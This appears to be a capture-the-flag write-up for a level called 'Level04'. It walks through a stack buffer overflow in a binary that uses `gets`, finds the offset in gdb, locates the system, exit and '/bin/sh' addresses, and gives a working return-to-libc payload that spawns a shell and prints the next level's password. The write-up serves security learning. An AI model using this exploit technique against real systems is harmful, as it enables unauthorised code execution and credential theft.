## Level04

First, I disassembled the executable and converted it into easy-to-understand C code (see `source.c`).
</br>
In `source.c`, we can see that `gets` is being used, so we can exploit this to cause an overflow and perform a return-to-libc attack.
</br>
But first we need to find the buffer size for the overflow, then the addresses of `system`, `exit`, and `/bin/sh`.

To determine the buffer size, we'll use a tool.
</br>
<<https://wiremask.eu/tools/buffer-overflow-pattern-generator/>>

```bash
$ gdb ./level04
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04
[New process 1681]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1681]
0x41326641 in ?? ()
```

So the offset is 156.
</br>
Now let's look for the necessary addresses.

```bash
$ gdb ./level04
(gdb) b main
Breakpoint 1 at 0x80486cd
(gdb) r
Starting program: /home/users/level04/level04

Breakpoint 1, 0x080486cd in main ()
(gdb) info function system
...
0xf7e6aed0  system
...
(gdb) info function exit
...
0xf7e5eb70  exit
...
(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
0xf7f897ec
```

and there you go.

```bash
$ (python -c "print('A' * 156 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7')"; cat) | ./level04
Give me some shellcode, k
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
